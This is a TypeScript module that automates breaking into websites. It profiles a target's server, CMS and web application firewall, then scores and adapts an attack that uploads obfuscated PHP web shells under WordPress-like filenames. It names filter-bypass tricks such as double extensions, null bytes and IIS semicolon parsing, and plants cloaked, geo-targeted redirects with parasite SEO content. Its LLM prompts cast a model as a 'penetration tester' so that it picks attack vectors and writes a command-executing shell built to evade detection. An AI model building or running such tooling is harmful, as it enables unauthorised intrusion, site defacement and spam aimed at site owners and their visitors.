// ═══════════════════════════════════════════════════════════════
//  AI DEPLOY INTELLIGENCE ENGINE
//  AI-powered analysis, strategy selection, and adaptive deployment
//  Maximizes success probability at every step of the deploy pipeline
// ═══════════════════════════════════════════════════════════════

import { invokeLLM } from "./_core/llm";

// ─── Types ───

export interface TargetProfile {
  domain: string;
  serverType: string | null;       // Apache, Nginx, IIS, LiteSpeed, etc.
  cms: string | null;              // WordPress, Joomla, Drupal, custom
  cmsVersion: string | null;
  phpVersion: string | null;
  wafDetected: string | null;      // Cloudflare, ModSecurity, Sucuri, Wordfence, etc.
  osGuess: string | null;          // Linux, Windows
  openPorts: number[];
  securityHeaders: Record<string, string>;
  writablePaths: string[];
  exposedEndpoints: string[];
  hasFileUpload: boolean;
  hasXmlrpc: boolean;
  hasRestApi: boolean;
  hasDirectoryListing: boolean;
  sslEnabled: boolean;
  responseTime: number;            // ms
}

export interface AIStrategyDecision {
  overallSuccessProbability: number;  // 0-100
  riskLevel: "low" | "medium" | "high" | "critical";
  
  // Strategy selections
  recommendedApproach: "direct_upload" | "shell_first" | "hybrid" | "stealth";
  shellStrategy: {
    obfuscationLayers: number;       // 2-6 based on WAF
    recommendedFilename: string;
    filenameBypassTechnique: string;
    evasionTechniques: string[];
  };
  uploadStrategy: {
    methodPriority: string[];        // ordered by success probability
    pathPriority: string[];          // ordered by success probability
    timingStrategy: "fast" | "slow" | "randomized";
    delayBetweenUploads: number;     // ms
  };
  redirectStrategy: {
    primaryMethod: string;           // php_302, js_obfuscated, meta_refresh, htaccess
    fallbackMethods: string[];
    cloakingEnabled: boolean;
    geoTargeting: boolean;
    delaySeconds: number;
  };
  contentStrategy: {
    parasiteTemplate: string | null;
    contentLanguage: string;
    seoOptimization: string[];
  };
  
  // AI reasoning
  reasoning: string;
  warnings: string[];
  adaptations: string[];           // real-time adaptations based on step results
}

export interface StepAnalysis {
  stepName: string;
  success: boolean;
  details: string;
  aiRecommendation: string;
  adaptedStrategy: Partial<AIStrategyDecision> | null;
  nextStepAdjustments: string[];
}

export interface AIDeployIntelligence {
  targetProfile: TargetProfile;
  strategy: AIStrategyDecision;
  stepAnalyses: StepAnalysis[];
  finalAnalysis: {
    overallSuccess: boolean;
    lessonsLearned: string[];
    improvementsForNextDeploy: string[];
    detectionRisk: "low" | "medium" | "high";
  } | null;
}

// ─── Target Profiling ───

export function buildTargetProfile(
  scanResult: {
    uploadPaths: { path: string; status: number; writable: boolean; type: string }[];
    vulnPaths: { path: string; status: number; exists: boolean; type: string }[];
    serverInfo: { server?: string; poweredBy?: string; cms?: string };
    bestUploadPath: string | null;
  },
  headers?: Record<string, string>,
): TargetProfile {
  const serverHeader = scanResult.serverInfo.server || "";
  const poweredBy = scanResult.serverInfo.poweredBy || "";
  
  // Detect server type
  let serverType: string | null = null;
  if (serverHeader.toLowerCase().includes("apache")) serverType = "Apache";
  else if (serverHeader.toLowerCase().includes("nginx")) serverType = "Nginx";
  else if (serverHeader.toLowerCase().includes("iis")) serverType = "IIS";
  else if (serverHeader.toLowerCase().includes("litespeed")) serverType = "LiteSpeed";
  else if (serverHeader.toLowerCase().includes("cloudflare")) serverType = "Cloudflare";
  else if (serverHeader) serverType = serverHeader;
  
  // Detect WAF
  let wafDetected: string | null = null;
  const allHeaders = { ...headers };
  if (serverHeader.toLowerCase().includes("cloudflare")) wafDetected = "Cloudflare";
  else if (allHeaders?.["x-sucuri-id"]) wafDetected = "Sucuri";
  else if (allHeaders?.["x-cdn"]) wafDetected = "CDN/WAF";
  
  // Check for WordPress-specific endpoints
  const hasXmlrpc = scanResult.vulnPaths.some(p => p.path === "/xmlrpc.php" && p.exists);
  const hasRestApi = scanResult.vulnPaths.some(p => p.path.includes("wp-json") && p.exists);
  
  // Detect PHP version from X-Powered-By
  let phpVersion: string | null = null;
  if (poweredBy.includes("PHP")) {
    const match = poweredBy.match(/PHP\/([\d.]+)/);
    if (match) phpVersion = match[1];
  }
  
  // OS guess
  let osGuess: string | null = null;
  if (serverHeader.toLowerCase().includes("win") || serverHeader.toLowerCase().includes("iis")) {
    osGuess = "Windows";
  } else {
    osGuess = "Linux";
  }
  
  // Security headers
  const securityHeaders: Record<string, string> = {};
  if (headers) {
    const secHeaders = ["x-frame-options", "x-content-type-options", "content-security-policy", 
                        "strict-transport-security", "x-xss-protection", "permissions-policy"];
    for (const h of secHeaders) {
      if (headers[h]) securityHeaders[h] = headers[h];
    }
  }
  
  const writablePaths = scanResult.uploadPaths.filter(p => p.writable).map(p => p.path);
  const exposedEndpoints = scanResult.vulnPaths.filter(p => p.exists).map(p => p.path);
  const hasDirectoryListing = scanResult.uploadPaths.some(p => p.type === "directory_listing");
  const hasFileUpload = writablePaths.some(p => p.includes("upload"));
  
  return {
    domain: "",
    serverType,
    cms: scanResult.serverInfo.cms || null,
    cmsVersion: null,
    phpVersion,
    wafDetected,
    osGuess,
    openPorts: [],
    securityHeaders,
    writablePaths,
    exposedEndpoints,
    hasFileUpload,
    hasXmlrpc,
    hasRestApi,
    hasDirectoryListing,
    sslEnabled: true,
    responseTime: 0,
  };
}

// ─── AI Strategy Calculator ───

export function calculateBaseSuccessProbability(profile: TargetProfile): number {
  let probability = 50; // base
  
  // Writable paths boost
  if (profile.writablePaths.length >= 5) probability += 15;
  else if (profile.writablePaths.length >= 3) probability += 10;
  else if (profile.writablePaths.length >= 1) probability += 5;
  else probability -= 20;
  
  // CMS detection
  if (profile.cms === "WordPress") {
    probability += 10; // WordPress has known upload paths
    if (profile.hasXmlrpc) probability += 5;
    if (profile.hasRestApi) probability += 3;
    if (profile.hasFileUpload) probability += 8;
  }
  
  // WAF penalty
  if (profile.wafDetected) {
    if (profile.wafDetected === "Cloudflare") probability -= 15;
    else if (profile.wafDetected === "Sucuri") probability -= 20;
    else probability -= 10;
  }
  
  // Server type adjustments
  if (profile.serverType === "Apache") probability += 5; // more permissive by default
  if (profile.serverType === "Nginx") probability -= 3; // stricter config
  if (profile.serverType === "IIS") probability += 3; // known bypass techniques
  
  // Security headers penalty
  const headerCount = Object.keys(profile.securityHeaders).length;
  if (headerCount >= 4) probability -= 10;
  else if (headerCount >= 2) probability -= 5;
  
  // Directory listing is a good sign
  if (profile.hasDirectoryListing) probability += 8;
  
  // Old PHP versions are more vulnerable
  if (profile.phpVersion) {
    const major = parseInt(profile.phpVersion.split(".")[0]);
    if (major <= 5) probability += 10;
    else if (major <= 7) probability += 5;
  }
  
  // Exposed endpoints boost
  if (profile.exposedEndpoints.length >= 3) probability += 5;
  
  return Math.max(5, Math.min(95, probability));
}

export function selectOptimalStrategy(profile: TargetProfile): AIStrategyDecision {
  const baseProbability = calculateBaseSuccessProbability(profile);
  
  // Determine risk level
  let riskLevel: "low" | "medium" | "high" | "critical" = "medium";
  if (baseProbability >= 70) riskLevel = "low";
  else if (baseProbability >= 50) riskLevel = "medium";
  else if (baseProbability >= 30) riskLevel = "high";
  else riskLevel = "critical";
  
  // Select approach based on profile
  let recommendedApproach: "direct_upload" | "shell_first" | "hybrid" | "stealth" = "hybrid";
  if (profile.wafDetected) {
    recommendedApproach = "stealth"; // WAF detected, go slow and careful
  } else if (profile.writablePaths.length >= 3 && !profile.wafDetected) {
    recommendedApproach = "direct_upload"; // many writable paths, no WAF
  } else if (profile.cms === "WordPress" && profile.hasFileUpload) {
    recommendedApproach = "shell_first"; // WordPress with upload capability
  }
  
  // Shell strategy
  let obfuscationLayers = 4;
  let filenameBypassTechnique = "standard";
  const evasionTechniques: string[] = [];
  
  if (profile.wafDetected === "Cloudflare") {
    obfuscationLayers = 6;
    filenameBypassTechnique = "double_ext_jpg";
    evasionTechniques.push("chunked_encoding", "content_type_mismatch", "slow_post");
  } else if (profile.wafDetected === "Sucuri") {
    obfuscationLayers = 5;
    filenameBypassTechnique = "alt_ext_phtml";
    evasionTechniques.push("null_byte", "unicode_normalization");
  } else if (profile.wafDetected) {
    obfuscationLayers = 5;
    filenameBypassTechnique = "case_variation";
    evasionTechniques.push("header_injection", "multipart_boundary");
  }
  
  if (profile.serverType === "IIS") {
    filenameBypassTechnique = "semicolon_bypass";
    evasionTechniques.push("iis_short_name", "semicolon_parsing");
  }
  
  if (profile.osGuess === "Windows") {
    evasionTechniques.push("trailing_dot", "alternate_data_stream");
  }
  
  // Generate recommended filename based on CMS
  let recommendedFilename = `wp-cache-${randomHex(8)}.php`;
  if (profile.cms === "WordPress") {
    const wpNames = [
      `class-wp-${randomHex(6)}.php`,
      `wp-tmp-${randomHex(6)}.php`,
      `wp-cron-${randomHex(6)}.php`,
      `plugin-${randomHex(6)}.php`,
    ];
    recommendedFilename = wpNames[Math.floor(Math.random() * wpNames.length)];
  } else if (profile.serverType === "Nginx") {
    recommendedFilename = `.cache-${randomHex(8)}.php`;
  }
  
  // Upload strategy — prioritize paths by success probability
  const pathPriority = [...profile.writablePaths];
  if (profile.cms === "WordPress") {
    // WordPress-specific path ordering
    const wpPriority = ["/wp-content/uploads/", "/wp-content/themes/", "/wp-content/plugins/", "/wp-includes/"];
    pathPriority.sort((a, b) => {
      const aIdx = wpPriority.findIndex(p => a.includes(p));
      const bIdx = wpPriority.findIndex(p => b.includes(p));
      return (aIdx === -1 ? 99 : aIdx) - (bIdx === -1 ? 99 : bIdx);
    });
  }
  
  // Method priority based on server
  let methodPriority = ["PUT", "POST_multipart", "POST_raw", "MOVE", "PATCH"];
  if (profile.serverType === "Apache") {
    methodPriority = ["PUT", "POST_multipart", "POST_raw", "MOVE"];
  } else if (profile.serverType === "IIS") {
    methodPriority = ["PUT", "MOVE", "POST_multipart", "POST_raw"];
  } else if (profile.serverType === "Nginx") {
    methodPriority = ["POST_multipart", "POST_raw", "PUT"];
  }
  
  // Timing strategy
  let timingStrategy: "fast" | "slow" | "randomized" = "fast";
  let delayBetweenUploads = 100;
  if (profile.wafDetected) {
    timingStrategy = "randomized";
    delayBetweenUploads = 500 + Math.floor(Math.random() * 1500);
  } else if (riskLevel === "high") {
    timingStrategy = "slow";
    delayBetweenUploads = 300;
  }
  
  // Redirect strategy
  let primaryRedirectMethod = "php_302";
  const fallbackMethods: string[] = [];
  let cloakingEnabled = false;
  
  if (profile.serverType === "Apache") {
    primaryRedirectMethod = "htaccess";
    fallbackMethods.push("php_302", "js_obfuscated", "meta_refresh");
  } else if (profile.serverType === "Nginx") {
    primaryRedirectMethod = "php_302";
    fallbackMethods.push("js_obfuscated", "meta_refresh");
  } else if (profile.serverType === "IIS") {
    primaryRedirectMethod = "js_obfuscated";
    fallbackMethods.push("meta_refresh", "php_302");
  } else {
    fallbackMethods.push("js_obfuscated", "meta_refresh", "htaccess");
  }
  
  if (profile.wafDetected) {
    cloakingEnabled = true;
    primaryRedirectMethod = "js_obfuscated"; // JS is harder for WAFs to detect
    fallbackMethods.unshift("meta_refresh");
  }
  
  // Build reasoning
  const reasoning = buildReasoning(profile, baseProbability, recommendedApproach, riskLevel);
  
  // Warnings
  const warnings: string[] = [];
  if (profile.wafDetected) warnings.push(`WAF detected: ${profile.wafDetected} — using stealth mode`);
  if (profile.writablePaths.length === 0) warnings.push("No writable paths found — success probability is low");
  if (Object.keys(profile.securityHeaders).length >= 4) warnings.push("Strong security headers detected — server is well-configured");
  if (baseProbability < 30) warnings.push("Very low success probability — consider using proxy rotation");
  
  return {
    overallSuccessProbability: baseProbability,
    riskLevel,
    recommendedApproach,
    shellStrategy: {
      obfuscationLayers,
      recommendedFilename,
      filenameBypassTechnique,
      evasionTechniques,
    },
    uploadStrategy: {
      methodPriority,
      pathPriority,
      timingStrategy,
      delayBetweenUploads,
    },
    redirectStrategy: {
      primaryMethod: primaryRedirectMethod,
      fallbackMethods,
      cloakingEnabled,
      geoTargeting: true,
      delaySeconds: profile.wafDetected ? 3 : 1,
    },
    contentStrategy: {
      parasiteTemplate: null,
      contentLanguage: "th",
      seoOptimization: ["schema_markup", "meta_tags", "keyword_density", "internal_linking"],
    },
    reasoning,
    warnings,
    adaptations: [],
  };
}

// ─── AI Real-time Adaptation ───

export function adaptStrategyAfterStep(
  currentStrategy: AIStrategyDecision,
  stepResult: StepAnalysis,
): AIStrategyDecision {
  const adapted = { ...currentStrategy };
  adapted.adaptations = [...currentStrategy.adaptations];
  
  if (stepResult.stepName === "scan" && !stepResult.success) {
    // Scan failed — reduce probability, switch to aggressive mode
    adapted.overallSuccessProbability = Math.max(5, adapted.overallSuccessProbability - 15);
    adapted.uploadStrategy.timingStrategy = "fast"; // try everything quickly
    adapted.adaptations.push("Scan failed → switched to aggressive fast mode");
  }
  
  if (stepResult.stepName === "direct_upload") {
    if (stepResult.success) {
      // Direct upload worked! Boost probability
      adapted.overallSuccessProbability = Math.min(95, adapted.overallSuccessProbability + 20);
      adapted.adaptations.push("Direct upload succeeded → boosted probability, shell may not be needed");
    } else {
      // Direct upload failed — adjust shell strategy
      adapted.overallSuccessProbability = Math.max(5, adapted.overallSuccessProbability - 10);
      adapted.shellStrategy.obfuscationLayers = Math.min(6, adapted.shellStrategy.obfuscationLayers + 1);
      adapted.adaptations.push("Direct upload failed → increased shell obfuscation layers");
    }
  }
  
  if (stepResult.stepName === "upload_shell") {
    if (stepResult.success) {
      adapted.overallSuccessProbability = Math.min(95, adapted.overallSuccessProbability + 15);
      adapted.adaptations.push("Shell uploaded successfully → high confidence for file deployment");
    } else {
      adapted.overallSuccessProbability = Math.max(5, adapted.overallSuccessProbability - 20);
      // Try different approach
      if (adapted.uploadStrategy.timingStrategy === "fast") {
        adapted.uploadStrategy.timingStrategy = "slow";
        adapted.uploadStrategy.delayBetweenUploads = 2000;
        adapted.adaptations.push("Shell upload failed → switching to slow timing with delays");
      }
    }
  }
  
  if (stepResult.stepName === "verify_shell") {
    if (stepResult.success) {
      adapted.overallSuccessProbability = Math.min(95, adapted.overallSuccessProbability + 10);
      adapted.adaptations.push("Shell verified active → proceeding with full deployment");
    } else {
      adapted.overallSuccessProbability = Math.max(5, adapted.overallSuccessProbability - 15);
      adapted.adaptations.push("Shell verification failed → shell may have been detected and removed");
    }
  }
  
  if (stepResult.stepName === "deploy_files") {
    if (stepResult.success) {
      adapted.overallSuccessProbability = Math.min(95, adapted.overallSuccessProbability + 10);
    } else {
      adapted.overallSuccessProbability = Math.max(5, adapted.overallSuccessProbability - 10);
      // Switch redirect method
      if (adapted.redirectStrategy.fallbackMethods.length > 0) {
        const fallback = adapted.redirectStrategy.fallbackMethods.shift()!;
        adapted.redirectStrategy.primaryMethod = fallback;
        adapted.adaptations.push(`File deployment issues → switching redirect to ${fallback}`);
      }
    }
  }
  
  return adapted;
}

// ─── AI LLM-Powered Deep Analysis ───

export async function aiAnalyzeTarget(profile: TargetProfile, domain: string): Promise<{
  analysis: string;
  vulnerabilities: string[];
  recommendedAttackVectors: string[];
  estimatedDifficulty: "easy" | "medium" | "hard" | "very_hard";
  customPayloadSuggestions: string[];
}> {
  try {
    const response = await invokeLLM({
      messages: [
        {
          role: "system",
          content: `You are an expert penetration tester and web security analyst. Analyze the target server profile and provide tactical recommendations for file upload and code execution. Be specific and technical. ตอบเป็นภาษาไทยทั้งหมด (ยกเว้นชื่อเทคนิค/เครื่องมือ). Respond in JSON format.`,
        },
        {
          role: "user",
          content: `Analyze this target for file upload/code execution:

Domain: ${domain}
Server: ${profile.serverType || "Unknown"}
CMS: ${profile.cms || "Unknown"}
PHP: ${profile.phpVersion || "Unknown"}
WAF: ${profile.wafDetected || "None"}
OS: ${profile.osGuess || "Unknown"}
Writable Paths: ${profile.writablePaths.join(", ") || "None found"}
Exposed Endpoints: ${profile.exposedEndpoints.join(", ") || "None"}
Security Headers: ${JSON.stringify(profile.securityHeaders)}
Has File Upload: ${profile.hasFileUpload}
Has XMLRPC: ${profile.hasXmlrpc}
Has REST API: ${profile.hasRestApi}
Directory Listing: ${profile.hasDirectoryListing}

Provide:
1. Brief analysis of the target's security posture
2. Top 3-5 specific vulnerabilities to exploit
3. Recommended attack vectors (ordered by success probability)
4. Difficulty assessment
5. Custom payload suggestions for this specific server configuration

Respond as JSON: { "analysis": "...", "vulnerabilities": ["..."], "recommendedAttackVectors": ["..."], "estimatedDifficulty": "easy|medium|hard|very_hard", "customPayloadSuggestions": ["..."] }`,
        },
      ],
      response_format: {
        type: "json_schema",
        json_schema: {
          name: "target_analysis",
          strict: true,
          schema: {
            type: "object",
            properties: {
              analysis: { type: "string", description: "Brief security posture analysis" },
              vulnerabilities: { type: "array", items: { type: "string" }, description: "Specific vulnerabilities" },
              recommendedAttackVectors: { type: "array", items: { type: "string" }, description: "Attack vectors ordered by probability" },
              estimatedDifficulty: { type: "string", description: "easy, medium, hard, or very_hard" },
              customPayloadSuggestions: { type: "array", items: { type: "string" }, description: "Custom payload suggestions" },
            },
            required: ["analysis", "vulnerabilities", "recommendedAttackVectors", "estimatedDifficulty", "customPayloadSuggestions"],
            additionalProperties: false,
          },
        },
      },
    });
    
    const content = response.choices?.[0]?.message?.content;
    if (content && typeof content === "string") {
      return JSON.parse(content);
    }
  } catch (e) {
    // Fallback to rule-based analysis
  }
  
  // Fallback
  return {
    analysis: `Target ${domain} running ${profile.serverType || "unknown"} server${profile.cms ? ` with ${profile.cms}` : ""}. ${profile.wafDetected ? `WAF detected: ${profile.wafDetected}` : "No WAF detected"}.`,
    vulnerabilities: profile.writablePaths.length > 0 
      ? ["Writable upload directories", ...profile.exposedEndpoints.map(e => `Exposed: ${e}`)]
      : ["Limited attack surface"],
    recommendedAttackVectors: ["Direct file upload", "Shell upload via PUT/POST", "CMS exploit"],
    estimatedDifficulty: profile.wafDetected ? "hard" : profile.writablePaths.length > 2 ? "easy" : "medium",
    customPayloadSuggestions: ["Standard PHP shell with obfuscation"],
  };
}

export async function aiAnalyzeStepResult(
  stepName: string,
  stepDetails: string,
  profile: TargetProfile,
  currentStrategy: AIStrategyDecision,
): Promise<{
  recommendation: string;
  adjustments: string[];
  newProbability: number;
  shouldContinue: boolean;
  alternativeApproach: string | null;
}> {
  try {
    const response = await invokeLLM({
      messages: [
        {
          role: "system",
          content: `You are an AI deploy strategist. Analyze the result of a deployment step and recommend adjustments. Be concise and tactical. ตอบเป็นภาษาไทยทั้งหมด (ยกเว้นชื่อเทคนิค/เครื่องมือ). Respond in JSON.`,
        },
        {
          role: "user",
          content: `Step "${stepName}" completed with result: ${stepDetails}

Current strategy: ${currentStrategy.recommendedApproach}
Current probability: ${currentStrategy.overallSuccessProbability}%
Server: ${profile.serverType}, WAF: ${profile.wafDetected || "none"}
Warnings so far: ${currentStrategy.warnings.join("; ")}
Adaptations so far: ${currentStrategy.adaptations.join("; ")}

What adjustments should be made? Should we continue? Any alternative approach?

Respond as JSON: { "recommendation": "...", "adjustments": ["..."], "newProbability": 0-100, "shouldContinue": true/false, "alternativeApproach": "..." }`,
        },
      ],
      response_format: {
        type: "json_schema",
        json_schema: {
          name: "step_analysis",
          strict: true,
          schema: {
            type: "object",
            properties: {
              recommendation: { type: "string" },
              adjustments: { type: "array", items: { type: "string" } },
              newProbability: { type: "number" },
              shouldContinue: { type: "boolean" },
              alternativeApproach: { type: ["string", "null"] },
            },
            required: ["recommendation", "adjustments", "newProbability", "shouldContinue", "alternativeApproach"],
            additionalProperties: false,
          },
        },
      },
    });
    
    const content = response.choices?.[0]?.message?.content;
    if (content && typeof content === "string") {
      return JSON.parse(content);
    }
  } catch (e) {
    // Fallback
  }
  
  return {
    recommendation: "Continue with current strategy",
    adjustments: [],
    newProbability: currentStrategy.overallSuccessProbability,
    shouldContinue: true,
    alternativeApproach: null,
  };
}

export async function aiPostDeployAnalysis(
  profile: TargetProfile,
  strategy: AIStrategyDecision,
  stepResults: StepAnalysis[],
  overallSuccess: boolean,
): Promise<{
  summary: string;
  lessonsLearned: string[];
  improvementsForNextDeploy: string[];
  detectionRisk: "low" | "medium" | "high";
  successFactors: string[];
  failureFactors: string[];
}> {
  try {
    const response = await invokeLLM({
      messages: [
        {
          role: "system",
          content: `You are an AI post-deployment analyst. Analyze the complete deployment results and provide actionable insights for future deployments. Be specific and data-driven. ตอบเป็นภาษาไทยทั้งหมด (ยกเว้นชื่อเทคนิค/เครื่องมือ). Respond in JSON.`,
        },
        {
          role: "user",
          content: `Deploy ${overallSuccess ? "SUCCEEDED" : "FAILED"} on ${profile.domain}

Server: ${profile.serverType}, CMS: ${profile.cms}, WAF: ${profile.wafDetected || "none"}
Strategy used: ${strategy.recommendedApproach}
Initial probability: ${strategy.overallSuccessProbability}%

Step results:
${stepResults.map(s => `- ${s.stepName}: ${s.success ? "✅" : "❌"} ${s.details}`).join("\n")}

Adaptations made: ${strategy.adaptations.join("; ")}
Warnings: ${strategy.warnings.join("; ")}

Provide post-deploy analysis as JSON: { "summary": "...", "lessonsLearned": ["..."], "improvementsForNextDeploy": ["..."], "detectionRisk": "low|medium|high", "successFactors": ["..."], "failureFactors": ["..."] }`,
        },
      ],
      response_format: {
        type: "json_schema",
        json_schema: {
          name: "post_deploy_analysis",
          strict: true,
          schema: {
            type: "object",
            properties: {
              summary: { type: "string" },
              lessonsLearned: { type: "array", items: { type: "string" } },
              improvementsForNextDeploy: { type: "array", items: { type: "string" } },
              detectionRisk: { type: "string" },
              successFactors: { type: "array", items: { type: "string" } },
              failureFactors: { type: "array", items: { type: "string" } },
            },
            required: ["summary", "lessonsLearned", "improvementsForNextDeploy", "detectionRisk", "successFactors", "failureFactors"],
            additionalProperties: false,
          },
        },
      },
    });
    
    const content = response.choices?.[0]?.message?.content;
    if (content && typeof content === "string") {
      const parsed = JSON.parse(content);
      return {
        ...parsed,
        detectionRisk: ["low", "medium", "high"].includes(parsed.detectionRisk) ? parsed.detectionRisk : "medium",
      };
    }
  } catch (e) {
    // Fallback
  }
  
  return {
    summary: overallSuccess ? "Deploy completed successfully" : "Deploy encountered issues",
    lessonsLearned: strategy.adaptations,
    improvementsForNextDeploy: strategy.warnings,
    detectionRisk: strategy.riskLevel === "critical" ? "high" : strategy.riskLevel === "high" ? "high" : "medium",
    successFactors: overallSuccess ? ["Strategy matched target profile"] : [],
    failureFactors: !overallSuccess ? ["Target security measures blocked deployment"] : [],
  };
}

// ─── AI Shell Code Generator ───

export async function aiGenerateCustomShell(profile: TargetProfile): Promise<{
  shellCode: string;
  shellPassword: string;
  explanation: string;
  evasionTechniques: string[];
} | null> {
  // Generate a cryptographically random password for this shell instance
  const shellPassword = randomHex(16);

  try {
    const response = await invokeLLM({
      messages: [
        {
          role: "system",
          content: `You are an expert in PHP web shell development for penetration testing. Generate a custom PHP shell optimized for the target environment. The shell must:
1. Accept a password parameter 'k' via GET
2. Support 'cmd' POST parameter for command execution
3. Support 'file' and 'content' POST parameters for file writing
4. Echo "SHELL_OK" on successful auth
5. Use obfuscation appropriate for the target WAF
6. Be as small as possible while maintaining functionality

Return ONLY the PHP code, no explanation.`,
        },
        {
          role: "user",
          content: `Generate a custom PHP shell for:
Server: ${profile.serverType || "Apache"}
PHP: ${profile.phpVersion || "7.4+"}
WAF: ${profile.wafDetected || "None"}
OS: ${profile.osGuess || "Linux"}

The shell should evade ${profile.wafDetected || "basic"} detection.
Use password: ${shellPassword}`,
        },
      ],
    });
    
    const content = response.choices?.[0]?.message?.content;
    if (content && typeof content === "string") {
      // Extract PHP code
      const phpMatch = content.match(/<\?php[\s\S]*?\?>/);
      let shellCode = phpMatch ? phpMatch[0] : content;

      // Safety check: ensure the generated shell actually contains our password
      // If the LLM used a different password, replace it
      if (!shellCode.includes(shellPassword)) {
        // Try to find and replace common password patterns in the generated code
        const commonPatterns = [
          /\$(?:pass|pwd|key|password|auth)\s*=\s*['"]([^'"]+)['"]/i,
          /md5\(['"]([^'"]+)['"]\)/i,
          /sha1\(['"]([^'"]+)['"]\)/i,
        ];
        for (const pattern of commonPatterns) {
          const match = shellCode.match(pattern);
          if (match && match[1]) {
            shellCode = shellCode.replace(match[1], shellPassword);
            break;
          }
        }
      }
      
      return {
        shellCode,
        shellPassword,
        explanation: `Custom shell generated for ${profile.serverType || "unknown"} server${profile.wafDetected ? ` with ${profile.wafDetected} evasion` : ""}`,
        evasionTechniques: profile.wafDetected 
          ? [`${profile.wafDetected} bypass`, "variable obfuscation", "function aliasing"]
          : ["basic obfuscation"],
      };
    }
  } catch (e) {
    // Fallback to standard shell
  }
  
  return null;
}

// ─── Helpers ───

function randomHex(len: number): string {
  return Array.from({ length: len }, () => "0123456789abcdef"[Math.floor(Math.random() * 16)]).join("");
}

function buildReasoning(
  profile: TargetProfile,
  probability: number,
  approach: string,
  riskLevel: string,
): string {
  const parts: string[] = [];
  
  parts.push(`Target analysis: ${profile.serverType || "Unknown"} server${profile.cms ? ` running ${profile.cms}` : ""}.`);
  
  if (profile.wafDetected) {
    parts.push(`WAF detected (${profile.wafDetected}) — using stealth techniques with higher obfuscation.`);
  } else {
    parts.push(`No WAF detected — can use standard upload methods.`);
  }
  
  parts.push(`Found ${profile.writablePaths.length} writable paths and ${profile.exposedEndpoints.length} exposed endpoints.`);
  
  if (profile.cms === "WordPress") {
    parts.push(`WordPress CMS detected — prioritizing wp-content/uploads path and WordPress-compatible filenames.`);
  }
  
  parts.push(`Selected "${approach}" approach with ${probability}% estimated success probability (risk: ${riskLevel}).`);
  
  if (profile.phpVersion) {
    const major = parseInt(profile.phpVersion.split(".")[0]);
    if (major <= 5) parts.push(`PHP ${profile.phpVersion} detected — older version with known vulnerabilities.`);
  }
  
  return parts.join(" ");
}

// ─── Export convenience ───

export function createAIDeployIntelligence(profile: TargetProfile): AIDeployIntelligence {
  return {
    targetProfile: profile,
    strategy: selectOptimalStrategy(profile),
    stepAnalyses: [],
    finalAnalysis: null,
  };
}
